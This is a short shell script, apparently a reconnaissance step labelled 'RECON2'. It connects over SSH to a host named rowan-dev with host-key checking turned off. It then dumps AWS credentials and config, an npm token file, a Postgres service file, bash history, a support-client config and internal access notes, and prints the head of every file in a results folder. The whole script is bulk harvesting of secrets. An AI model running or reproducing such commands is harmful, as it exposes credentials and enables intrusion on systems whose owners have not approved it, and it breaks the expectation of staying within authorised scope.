set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no rowan-dev '
set +e
for f in ~/README.md ~/work/platform-access.md ~/work/identity-access.md ~/work/service-notes.md ~/work/local-helper.md ~/.bash_history ~/.npmrc ~/.pg_service.conf ~/.aws/config ~/.aws/credentials ~/.config/fieldlink/support-client.json; do
  echo "##### $f"; cat "$f" 2>&1; echo
done
echo "##### results dir"; ls -la ~/results; for f in ~/results/*; do echo "--- $f"; head -c 1500 "$f"; echo; done
'
echo DONE_RECON2
